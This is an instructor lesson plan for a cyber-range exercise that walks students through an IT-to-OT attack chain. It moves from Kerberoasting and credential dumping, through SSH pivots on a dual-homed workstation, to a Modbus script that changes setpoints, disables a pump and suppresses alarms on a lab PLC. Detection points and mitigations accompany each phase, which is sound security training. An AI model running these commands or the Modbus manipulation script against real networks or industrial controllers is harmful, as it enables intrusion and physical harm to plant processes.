# Lesson Plan — ICS/OT Pivot: IT to OT Kill Chain

## Course Information

- **Scenario ID**: SCEN-004
- **Duration**: 5 hours (including 30 min briefing + 30 min debrief)
- **Difficulty**: Expert
- **Class Size**: Up to 20 students (solo recommended, pairs acceptable)
- **Prerequisites**:
  - Completion of SCEN-002 (Kerberoasting) or equivalent AD attack experience
  - Completion of SCEN-001 (SCADA Modbus Recon) or equivalent Modbus knowledge
  - Working knowledge of SSH tunneling and port forwarding
  - Familiarity with Impacket, crackmapexec, and pymodbus
- **Lab Requirements**: 6 VMs per slot across 3 network zones (16 vCPU, 18 GB RAM per slot)

## Learning Objectives

By the end of this lab, students will be able to:

1. Execute a multi-phase credential escalation chain in an Active Directory environment using Kerberoasting (T1558.003) and credential dumping (T1003.001)
2. Establish network pivots through dual-homed hosts using SSH dynamic port forwarding and local port forwarding (T1021.004)
3. Perform Modbus TCP reconnaissance and process manipulation against a live PLC through a network pivot (T0846, T0855, T0836)
4. Articulate why IT/OT convergence creates critical risk by mapping the full attack chain to both ATT&CK Enterprise and ICS matrices
5. Identify detection opportunities at each phase boundary — AD events, network anomalies, and ICS process deviations

## Pre-Class Preparation

### Instructor Setup (30 minutes before class)

1. Deploy the scenario from the portal admin dashboard:
   - Navigate to Lab Slots, select target slots
   - Deploy scenario `ics_ot_pivot` to each active slot
   - Wait for all 6 VMs per slot to reach `running` status (~5 min)
2. Run post-deploy Ansible configuration:
   ```bash
   ansible-playbook -i inventory/ics_ot_pivot playbooks/ad-setup.yml \
     -e "vuln_kerberoast=true vuln_wdigest=true"
   ansible-playbook -i inventory/ics_ot_pivot playbooks/scada-full.yml
   ```
3. Verify from the portal:
   - dc01: responding on 445, 88, 389
   - eng-ws: responding on 22 (SSH)
   - openplc-01: responding on 502 (Modbus TCP) and 8080 (Web UI)
   - historian: responding on 3000 (Grafana) and 8086 (InfluxDB)
   - grfics-host: responding on 502 and 8080
4. Confirm credential chain works end-to-end from one test slot:
   ```bash
   crackmapexec smb <dc01_ip> -u jsmith -p 'Password123' -d lab.local
   crackmapexec ssh <eng_ws_ip> -u eng_admin -p 'Eng1neer2024!'
   ```
5. Distribute student access sheets (kali-attacker IP + jsmith credentials only)
6. Verify Grafana dashboard is showing live process data (confirms historian bridge is running)

### Student Prerequisites Check

Before starting, confirm each student can:
- SSH into their kali-attacker VM
- Run `impacket-GetUserSPNs --help` without errors
- Run `python3 -c "import pymodbus; print(pymodbus.__version__)"` successfully
- Explain what a TGS ticket is and why service accounts with SPNs are targets

---

## Lesson Flow

### Briefing Phase (30 minutes)

**Instructor presents** (use SLIDES_CONTENT.md):

- **Threat landscape**: IT/OT convergence attacks are the most dangerous category of ICS threats. Every major ICS incident in the last decade involved an IT-to-OT pivot.
- **Real-world incidents**: TRITON/TRISIS (2017, Saudi petrochemical), CRASHOVERRIDE (2016, Ukrainian power grid), Volt Typhoon (2023-present, US critical infrastructure pre-positioning), Oldsmar (2021, Florida water treatment).
- **The Purdue Model**: Walk through levels 0-5. Explain why engineering workstations (Level 3) are the most dangerous pivot point — they legitimately need access to both IT (Level 4/5) and OT (Level 2/1/0).
- **Student role**: "You are a red team operator simulating an advanced persistent threat. Through a prior phishing campaign, you obtained valid domain credentials for jsmith, a standard domain user. Your mission is to traverse the full IT-to-OT kill chain: escalate credentials, find the engineering workstation, pivot into the OT zone, and demonstrate the ability to manipulate an industrial control process."

**Discussion questions**:

1. "Why would an APT group target a utility's engineering workstation instead of attacking OT systems directly from the internet?"
   - *Expected answer*: OT systems are typically air-gapped or segmented. The engineering workstation is the bridge — it has legitimate access to both zones. Compromising it gives the attacker the same access an engineer has.
2. "What makes Modbus TCP particularly dangerous in this context?"
   - *Expected answer*: Modbus TCP has no authentication. Once you can reach port 502, you can read and write any register. The entire security model depends on network segmentation — which this attack bypasses.
3. "In the Purdue Model, which level boundary crossings does this attack violate?"
   - *Expected answer*: Level 5 (enterprise) to Level 4 (site business) via AD compromise, Level 4 to Level 3 (site operations) via eng-ws compromise, Level 3 to Level 2 (area supervisory) via SSH tunnel, Level 2 to Level 1 (basic control) via Modbus writes to PLC.

---

### Phase 1: IT Foothold (45 minutes)

**ATT&CK Technique**: T1021.002 — Remote Services: SMB/Windows Admin Shares

**What the adversary did**: Used stolen domain credentials (from a phishing campaign) to authenticate to the domain controller via SMB and begin internal reconnaissance.

**Why it worked**: The domain user account `jsmith` had standard domain user privileges, which is sufficient to authenticate via SMB, enumerate AD objects, and request Kerberos service tickets. No MFA was required for internal SMB authentication.

**Student task**: Use the jsmith credentials to establish a session on dc01 and enumerate Active Directory to discover service accounts, engineering accounts, and computer objects.

**Instructor walkthrough** (reveal progressively if students are stuck):

1. From kali-attacker, validate credentials:
   ```bash
   crackmapexec smb <dc01_ip> -u jsmith -p 'Password123' -d lab.local
   ```
2. Establish a shell on dc01:
   ```bash
   impacket-psexec lab.local/jsmith:'Password123'@<dc01_ip>
   ```
3. Enumerate domain users and groups:
   ```bash
   net user /domain
   net group "Domain Admins" /domain
   net user eng_admin /domain
   net user svc_scada /domain
   ```
4. Key findings to discover:
   - `eng_admin` — engineering team lead, has privileges on eng-ws
   - `svc_scada` — service account with an SPN set (Kerberoastable)
   - `eng-ws` — computer object in the domain

**Detection checkpoint**:
- "What would a defender see at this point?"
- Expected: Event ID 4624 (logon) for jsmith on dc01. If PsExec was used, Event ID 7045 (new service installed). SMB enumeration generates Event ID 4661 (directory service access) and Event ID 4662.
- Artifacts: Windows Security event log on dc01, Sysmon Event ID 1 (process creation) for net.exe commands.

**Key teaching point**: Domain users can enumerate the entire AD structure by default. This is not a vulnerability — it is how AD works. Restricting this requires explicit hardening (removing Authenticated Users from Pre-Windows 2000 Compatible Access group, etc.).

**Hints**:
- Level 1: "Start by validating the jsmith credentials against dc01 using crackmapexec."
- Level 2: "Use impacket-psexec to get a shell on dc01, then run `net user /domain` to list all domain accounts."
- Level 3: "Look for accounts with 'eng' or 'scada' in the name. The account `svc_scada` has an SPN — that means it is Kerberoastable."

---

### Phase 2: Credential Escalation (60 minutes)

**ATT&CK Techniques**: T1558.003 — Kerberoasting, T1003.001 — OS Credential Dumping: LSASS Memory

**What the adversary did**: Requested Kerberos TGS tickets for SPN-registered service accounts and cracked them offline to obtain service account passwords. Then used those credentials (or WDigest-cached cleartext) to discover engineering account credentials.

**Why it worked**: The service account `svc_scada` had a weak password that was crackable with standard wordlists. WDigest authentication was enabled on the domain, storing cleartext credentials in LSASS memory for any account that had recently logged in interactively.

**Student task**: Kerberoast the svc_scada service account, crack the hash offline, then obtain eng_admin credentials through credential dumping or share enumeration.

**Instructor walkthrough**:

1. Kerberoast from kali:
   ```bash
   impacket-GetUserSPNs lab.local/jsmith:'Password123' -dc-ip <dc01_ip> -request \
     -outputfile svc_scada.hash
   ```
2. Crack the TGS hash:
   ```bash
   hashcat -m 13100 svc_scada.hash /usr/share/wordlists/rockyou.txt
   # Expected result: Scada$vc2024
   ```
3. Find eng_admin credentials (multiple valid paths):
   - **Path A — WDigest dump**: `impacket-secretsdump lab.local/jsmith:'Password123'@<dc01_ip>` — look for eng_admin cleartext in the wdigest section
   - **Path B — Share enumeration**: Use svc_scada credentials to spider shares for scripts/configs containing eng_admin passwords
   - **Path C — CME enumeration**: `crackmapexec smb <dc01_ip> -u svc_scada -p 'Scada$vc2024' -d lab.local --shares`
4. Validate eng_admin credentials:
   ```bash
   crackmapexec ssh <eng_ws_blue_ip> -u eng_admin -p 'Eng1neer2024!'
   ```

**Detection checkpoint**:
- "What would a defender see during Kerberoasting?"
- Expected: Event ID 4769 (Kerberos Service Ticket Operation) with encryption type 0x17 (RC4-HMAC). Normal TGS requests use AES (0x12). A burst of RC4 TGS requests for service accounts is a strong Kerberoasting indicator.
- For credential dumping: Event ID 4656 (handle to LSASS), Event ID 10 (Sysmon ProcessAccess targeting lsass.exe).
- Artifacts: Kerberos traffic in network captures (port 88), LSASS access events.

**Key teaching point**: Kerberoasting is devastating because it requires zero elevated privileges — any domain user can request TGS tickets. The defense is strong service account passwords (25+ characters, managed) and AES-only Kerberos encryption. WDigest should be disabled on all modern Windows systems (it is disabled by default since Windows 8.1/Server 2012 R2, but attackers or misconfigurations can re-enable it).

**Hints**:
- Level 1: "The svc_scada account has an SPN. Use impacket-GetUserSPNs to request its TGS ticket."
- Level 2: "Save the hash to a file with `-outputfile svc_scada.hash`, then crack it with `hashcat -m 13100 svc_scada.hash /usr/share/wordlists/rockyou.txt`."
- Level 3: "After cracking svc_scada, you still need eng_admin. Try `impacket-secretsdump` against dc01 — WDigest is enabled, so cleartext credentials may be in LSASS memory. Look for eng_admin in the output."

---

### Phase 3: OT Zone Pivot (75 minutes)

**ATT&CK Technique**: T1021.004 — Remote Services: SSH

**What the adversary did**: Used compromised engineering credentials to SSH into the dual-homed engineering workstation, discovered the OT network interface, and established an SSH tunnel to route attack traffic into the OT zone.

**Why it worked**: The engineering workstation had two network interfaces — one on the IT network (vmbr2) and one on the OT network (vmbr3) — with no host-based firewall rules restricting traffic between them. SSH was enabled with password authentication. This is a common real-world configuration: engineers need to access both zones, and organizations rarely implement host-level segmentation on the workstation itself.

**Student task**: SSH into eng-ws using eng_admin credentials, discover the dual-homed OT interface, and set up an SSH tunnel or SOCKS proxy to reach OT zone hosts from kali.

**Instructor walkthrough**:

1. SSH to eng-ws:
   ```bash
   ssh eng_admin@<eng_ws_blue_ip>
   # Password: Eng1neer2024!
   ```
2. Discover the OT interface:
   ```bash
   ip addr show
   # Look for eth1 with 192.168.(100+N).x address
   ip route show
   # Confirm routes to OT subnet
   ```
3. Quick recon from eng-ws:
   ```bash
   nmap -sn 192.168.(100+N).0/24
   # Discover: .10 (openplc), .20 (historian), .30 (grfics)
   nmap -p 502,8080,8086,3000 192.168.(100+N).10-30
   ```
4. Set up the pivot (this is the critical step — extra detail below):

   **Option A — SOCKS proxy (recommended for flexibility)**:
   ```bash
   # From kali, open a new terminal:
   ssh -D 1080 -N eng_admin@<eng_ws_blue_ip>
   # -D 1080: dynamic port forward (SOCKS5 on localhost:1080)
   # -N: no remote command, just the tunnel

   # Configure proxychains:
   sudo cp /etc/proxychains4.conf /etc/proxychains4.conf.bak
   sudo sed -i 's/^socks4.*/socks5 127.0.0.1 1080/' /etc/proxychains4.conf

   # Now route any tool through the tunnel:
   proxychains nmap -sT -p 502 192.168.(100+N).10
   proxychains python3 modbus_recon.py
   ```

   **Option B — Local port forwards (simpler, per-port)**:
   ```bash
   # Forward Modbus TCP, Grafana, and HMI in one command:
   ssh -L 5502:192.168.(100+N).10:502 \
       -L 3000:192.168.(100+N).20:3000 \
       -L 8080:192.168.(100+N).30:8080 \
       -N eng_admin@<eng_ws_blue_ip>

   # Now access services on localhost:
   # Modbus: localhost:5502
   # Grafana: http://localhost:3000
   # HMI: http://localhost:8080
   ```

   **Option C — Reverse SOCKS (if SSH from kali to eng-ws is blocked)**:
   ```bash
   # From eng-ws, connect back to kali:
   ssh -R 1080 kali@<kali_ip>
   # This opens SOCKS proxy on kali's localhost:1080
   ```

5. Verify the tunnel works:
   ```bash
   # Test Modbus connectivity through the tunnel:
   python3 -c "
   from pymodbus.client import ModbusTcpClient
   client = ModbusTcpClient('127.0.0.1', port=5502)
   print('Connected:', client.connect())
   client.close()
   "
   ```

**Common student mistakes** (anticipate and address):
- Forgetting `-N` flag — SSH opens a shell instead of just the tunnel, causing confusion
- Using wrong local port — trying to connect to 502 instead of 5502
- Proxychains misconfiguration — wrong protocol (socks4 vs socks5) or wrong port
- Not running SSH tunnel in the background or a separate terminal — blocks the current session
- Trying to use UDP through a SOCKS proxy — SOCKS5 supports UDP but proxychains does not handle it well for Modbus (use local port forward instead)

**Detection checkpoint**:
- "What would a defender see during the pivot?"
- Expected: Unusual SSH session from a non-standard source (kali) to eng-ws. SSH sessions from eng-ws to OT zone hosts that eng-ws does not normally connect to. If SSH logging is enabled, session duration and data volume anomalies. Network flow data showing new TCP connections from eng-ws to port 502 on openplc-01.
- The key detection: eng-ws establishing TCP connections to OT hosts that are outside its normal baseline. A properly baselined NIDS would flag this.

**Key teaching point**: The engineering workstation is the Achilles' heel of every segmented ICS environment. It must exist — engineers need to program PLCs, access HMIs, and configure historians. But it bridges the air gap by design. Proper controls include: jump server architecture (no direct dual-homing), application whitelisting on the workstation, host-based firewall rules restricting which OT hosts it can reach, and monitoring all traffic that crosses the IT/OT boundary.

**Hints**:
- Level 1: "You need to SSH to eng-ws first. Once there, look at the network interfaces — `ip addr show` will reveal a second network on the OT zone."
- Level 2: "Set up an SSH tunnel from kali through eng-ws. Use `ssh -D 1080 -N eng_admin@<eng_ws_ip>` for a SOCKS proxy, then configure proxychains to use it. Or use `ssh -L 5502:192.168.x.10:502` for a direct Modbus forward."
- Level 3: "After setting up `ssh -L 5502:192.168.(100+N).10:502 -N eng_admin@<eng_ws_ip>`, test the tunnel with: `python3 -c \"from pymodbus.client import ModbusTcpClient; c = ModbusTcpClient('127.0.0.1', port=5502); print(c.connect()); c.close()\"`"

---

### Phase 4: ICS Exploitation (60 minutes)

**ATT&CK Techniques**: T0846 — Remote System Discovery, T0842 — Network Sniffing, T0855 — Unauthorized Command Message, T0836 — Modify Parameter

**What the adversary did**: Scanned the OT zone to discover ICS devices, read Modbus registers to understand the running process, then wrote to setpoint and control registers to manipulate the physical process — disabling pumps, altering setpoints, and suppressing alarms.

**Why it worked**: Modbus TCP has zero authentication. Any host that can reach port 502 can read any register and write to any writable register. The entire security model relies on network-level access control — which was bypassed by the SSH tunnel through the dual-homed workstation.

**Student task**: Scan the OT zone through the pivot, enumerate Modbus registers on openplc-01, then manipulate the process by writing to setpoint registers and disabling the pump.

**Instructor walkthrough**:

1. OT zone reconnaissance:
   ```bash
   # Via SOCKS proxy:
   proxychains nmap -sT -p 502,8080,8086,3000,4840 192.168.(100+N).10-30

   # Or via local port forward, test Modbus:
   python3 -c "
   from pymodbus.client import ModbusTcpClient
   client = ModbusTcpClient('127.0.0.1', port=5502)
   client.connect()
   coils = client.read_coils(0, 3, slave=1)
   print('Pump Enable:', coils.bits[0])
   client.close()
   "
   ```

2. Full Modbus enumeration:
   ```python
   #!/usr/bin/env python3
   # modbus_recon.py
   from pymodbus.client import ModbusTcpClient

   client = ModbusTcpClient('127.0.0.1', port=5502)
   client.connect()

   # Read coils
   coils = client.read_coils(0, 3, slave=1)
   print(f"Coil 0 (Pump Enable):  {coils.bits[0]}")
   print(f"Coil 1 (Alarm High):   {coils.bits[1]}")
   print(f"Coil 2 (Alarm Low):    {coils.bits[2]}")

   # Read input registers
   ir = client.read_input_registers(0, 1, slave=1)
   print(f"\nTank Level (IR 0):     {ir.registers[0]}")

   # Read holding registers
   hr = client.read_holding_registers(0, 1, slave=1)
   print(f"Pump Speed (HR 0):     {hr.registers[0]}")

   sp = client.read_holding_registers(1024, 3, slave=1)
   print(f"\nSetpoint (HR 1024):    {sp.registers[0]}")
   print(f"Alarm High (HR 1025):  {sp.registers[1]}")
   print(f"Alarm Low (HR 1026):   {sp.registers[2]}")

   client.close()
   ```

3. Process manipulation:
   ```python
   #!/usr/bin/env python3
   # modbus_attack.py
   from pymodbus.client import ModbusTcpClient
   import time

   client = ModbusTcpClient('127.0.0.1', port=5502)
   client.connect()

   # Attack 1: Alter setpoint
   print("[*] Lowering setpoint from 750 to 200...")
   client.write_register(1024, 200, slave=1)
   time.sleep(3)
   sp = client.read_holding_registers(1024, 1, slave=1)
   print(f"[+] Setpoint is now: {sp.registers[0]}")

   # Attack 2: Disable pump
   print("[*] Disabling pump (coil 0 -> False)...")
   client.write_coil(0, False, slave=1)

   # Attack 3: Suppress alarms
   print("[*] Suppressing alarms...")
   client.write_register(1025, 9999, slave=1)  # High alarm threshold
   client.write_register(1026, 0, slave=1)     # Low alarm threshold

   print("[+] Attack complete. Check Grafana to observe impact.")
   client.close()
   ```

4. Observe impact (bonus objectives):
   ```bash
   # Grafana: http://localhost:3000 (admin / LabGrafana2024!)
   # Navigate to SCADA Process Monitor dashboard
   # Observe: tank level dropping, pump speed at 0, setpoint changed

   # GRFICSv2 HMI: http://localhost:8080
   # Observe: chemical plant process state changes
   ```

**Detection checkpoint**:
- "What would a defender see in the OT zone?"
- Expected: Modbus FC06 (Write Single Register) and FC05 (Write Single Coil) from the eng-ws IP address — which is not a normal Modbus master. The historian's InfluxDB data will show sudden process value changes. Grafana alarms (if configured) would fire on setpoint deviations. A properly configured ICS-aware IDS (like Dragos or Claroty) would flag the new Modbus source.
- Wireshark filter for attack traffic: `modbus.func_code == 5 || modbus.func_code == 6`

**Key teaching point**: Modbus TCP was designed in 1979 for serial communication in trusted, isolated environments. It was never intended for TCP/IP networks and has no concept of authentication, authorization, or encryption. Every security control must be implemented at the network layer — firewalls, allowlists, monitoring. When the network perimeter fails (as it did here through the pivot), there is nothing left. Modern alternatives like OPC-UA support certificate-based authentication, but adoption in brownfield OT environments is slow.

**Hints**:
- Level 1: "Your tunnel is already set up. Use pymodbus to connect to `127.0.0.1` on your forwarded port and start reading registers."
- Level 2: "Read coils 0-2 with `client.read_coils(0, 3, slave=1)` and holding registers 1024-1026 with `client.read_holding_registers(1024, 3, slave=1)`. The setpoint is at HR 1024."
- Level 3: "To manipulate the process: `client.write_register(1024, 200, slave=1)` changes the setpoint. `client.write_coil(0, False, slave=1)` disables the pump. Check Grafana at `http://localhost:3000` to see the impact."

---

### Debrief Phase (30 minutes)

**Guided discussion**:

1. **Full attack chain reconstruction**: Draw the complete attack chain on the whiteboard (or have students draw it). Walk through each phase and identify the single control that would have stopped the attack at that point:
   - Phase 1: MFA on internal SMB authentication
   - Phase 2: Strong service account passwords (25+ chars, managed), AES-only Kerberos, WDigest disabled
   - Phase 3: Jump server architecture instead of dual-homed workstation, host-based firewall on eng-ws, SSH key-only authentication
   - Phase 4: Modbus source IP allowlisting, ICS-aware IDS, process alarm integrity monitoring

2. **The Purdue Model**: Map this attack to the Purdue Enterprise Reference Architecture:
   - Level 5 (Enterprise) → Level 4 (Site Business): jsmith credentials (AD compromise)
   - Level 4 → Level 3 (Site Operations): eng_admin credentials (lateral movement to eng-ws)
   - Level 3 → Level 2 (Area Supervisory): SSH tunnel (bypassed segmentation)
   - Level 2 → Level 1 (Basic Control): Modbus writes to PLC
   - Level 1 → Level 0 (Physical Process): Tank level, pump state changed

   Ask: "Which boundary crossing was the hardest for the attacker? Which was the easiest?" (Hardest: 3→2 pivot. Easiest: 2→1→0 — Modbus has no auth.)

3. **IT/OT convergence**: Discuss why the dual-homed engineering workstation is not a mistake — it is a business requirement. Engineers need to program PLCs, access historians, and configure SCADA systems. The question is not "should it exist?" but "how do we control it?"
   - Data diodes for one-way OT→IT data flow
   - Jump servers with session recording
   - Application whitelisting on engineering workstations
   - Separate credentials for IT and OT access (no credential reuse)
   - Network monitoring at the IT/OT boundary

4. **Real-world parallels**:
   - **TRITON/TRISIS (2017)**: Attackers compromised IT network at a Saudi petrochemical plant, pivoted to engineering workstations, then to Schneider Triconex safety instrumented systems. Goal: disable safety controllers before causing a physical event. This is the most dangerous ICS attack ever documented because it targeted safety systems.
   - **CRASHOVERRIDE/Industroyer (2016)**: Russian GRU compromised Ukrainian utility IT networks, pivoted to OT, and used IEC 61850/104 commands to open circuit breakers. Caused a blackout affecting 225,000 customers.
   - **Volt Typhoon (2023-present)**: Chinese APT group pre-positioning in US critical infrastructure IT networks — water, energy, transportation. No confirmed OT pivot yet, but assessed capability to do so. Living-off-the-land techniques make detection extremely difficult.
   - **Oldsmar Water Treatment (2021)**: Attacker accessed TeamViewer on the HMI directly (no IT pivot needed) and attempted to raise NaOH (lye) dosing from 100 ppm to 11,100 ppm. Caught by an alert operator watching the screen.

   Key question: "What made TRITON uniquely dangerous compared to the others?"
   - *Expected*: It targeted safety instrumented systems — the last line of defense before physical harm. All other attacks targeted process control; TRITON targeted the system designed to prevent catastrophic failure.

5. **Detection across domains**: The hardest part of detecting IT→OT attacks is that IT SOC and OT SOC (if one exists) are often separate teams with separate tools. Ask: "If you were building a detection program for this scenario, what data sources would you need, and how would you correlate them?"
   - IT: AD event logs (4769, 4624, 4656), Sysmon, network flow data
   - Network boundary: SSH session logs, flow data at the IT/OT firewall
   - OT: Modbus traffic captures, ICS-aware IDS (Dragos, Claroty, Nozomi), process historian anomaly detection
   - Correlation: Timeline alignment — Kerberoasting at T+0, SSH to eng-ws at T+15min, Modbus writes at T+30min

**ATT&CK mapping exercise**: Have students fill in the ATT&CK technique table from memory before revealing the answer. Require both Enterprise and ICS technique IDs. This reinforces the dual-matrix nature of IT/OT attacks.

---

## Assessment Rubric

| Criterion | Points | How to Verify |
|---|---|---|
| Established session on dc01 using jsmith | 10 | Screenshot of shell prompt or crackmapexec Pwn3d output |
| Enumerated AD users and identified eng_admin + svc_scada | 10 | Screenshot of `net user /domain` or equivalent output |
| Extracted svc_scada TGS hash via Kerberoasting | 15 | Output of impacket-GetUserSPNs showing the hash |
| Cracked svc_scada password offline | 10 | Hashcat output showing cracked password |
| Obtained eng_admin credentials | 15 | Evidence of credential discovery method used |
| Established SSH session on eng-ws | 10 | SSH session screenshot showing dual-homed interfaces |
| Discovered OT zone network from eng-ws | 5 | Output of `ip addr show` and `nmap -sn` on OT subnet |
| Set up working SSH tunnel to OT zone | 15 | Evidence of tunnel command and successful connection test |
| Read Modbus registers from openplc-01 via pivot | 10 | Output of pymodbus read commands showing register values |
| Wrote to Modbus registers to manipulate process | 15 | Output of pymodbus write commands and verification reads |
| Observed impact on Grafana dashboard (bonus) | 5 | Screenshot of Grafana showing process deviation |
| Accessed GRFICSv2 HMI (bonus) | 5 | Screenshot of HMI showing process state |
| Completed incident report with ATT&CK mapping | 15 | Submitted incident report with correct technique IDs |
| Identified detection opportunities at each phase | 10 | Written detection recommendations in incident report |
| **Total** | **150** | |

**Grading scale**:
- 135-150 (90%+): Exceptional — completed full chain with bonus objectives
- 120-134 (80%+): Proficient — completed full chain, solid documentation
- 100-119 (67%+): Developing — completed most phases, may have needed significant hints
- Below 100: Incomplete — did not achieve full kill chain, needs remediation

---

## Contingency Plans

### If students finish early

- **Challenge 1**: Write a Python script that continuously monitors Modbus registers via the tunnel and alerts when values deviate from baseline. This simulates building an OT anomaly detector.
- **Challenge 2**: Capture the Modbus traffic with Wireshark through the tunnel and build Snort/Suricata rules that would detect the attack.
- **Challenge 3**: Access the GRFICSv2 simulator and attempt to manipulate the chemical reactor process (different register map than the OpenPLC tank fill).
- **Challenge 4**: Write a detection rule for Kerberoasting (Event ID 4769 with encryption type 0x17) that would work in a SIEM.

### If students are stuck

- Use the portal hint system to push graduated hints to specific slots
- Phase-by-phase hints are documented in each phase section above (3 levels each)
- The SSH tunneling phase (Phase 3) is where most students get stuck. Have an instructor demonstrate the tunnel setup on the projector if more than half the class is blocked after 20 minutes.
- Never give the full answer — guide toward the next discovery step

### If infrastructure fails

- **Single VM down**: Reset the specific VM from the portal admin dashboard (Lab Slots → Reset to Baseline)
- **Scenario broken**: Admin → Lab Slots → Destroy → Redeploy (~5 min)
- **Fallback**: Walk through the scenario as a demonstration using the instructor's console. Project the screen and narrate each step. This still delivers the learning objectives even without hands-on time.
- **Partial completion**: If time runs out mid-scenario, jump to the debrief and walk through the remaining phases on the projector. The IT-to-OT pivot concept is the critical takeaway — students who completed Phases 1-3 have demonstrated the core skill.

### Time management

| Phase | Planned | Hard Stop |
|---|---|---|
| Briefing | 30 min | T+0:35 |
| Phase 1: IT Foothold | 45 min | T+1:15 |
| Phase 2: Credential Escalation | 60 min | T+2:30 |
| Phase 3: OT Zone Pivot | 75 min | T+3:45 |
| Phase 4: ICS Exploitation | 60 min | T+4:30 |
| Debrief | 30 min | T+5:00 |

If Phase 2 runs long, compress Phase 4 — students can be given the OT recon commands directly and focus on the Modbus write as the capstone. The pivot (Phase 3) should never be compressed; it is the core learning objective.
